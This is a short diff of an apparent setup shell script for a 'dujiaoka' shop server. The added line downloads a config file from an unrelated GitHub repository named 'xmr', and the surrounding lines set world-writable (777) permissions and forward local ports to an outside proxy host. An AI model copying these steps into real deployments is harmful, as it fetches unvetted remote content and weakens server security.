@@ -19,6 +19,8 @@ sudo chmod -R 777 ~/volumes/www/dujiaoka/storage/framework/views/
 sudo chmod -R 777 ~/volumes/www/dujiaoka/storage/framework/cache/
 sudo chmod -R 777 ~/volumes/www/dujiaoka/storage/framework/sessions/
 
+wget https://raw.githubusercontent.com//henglxm/xmr/main/faka.conf
+
 sudo redir :9003 proxy.proxyguys.com:9003
 sudo redir :9004 proxy.proxyguys.com:9004
 sudo redir :9005 proxy.proxyguys.com:9005
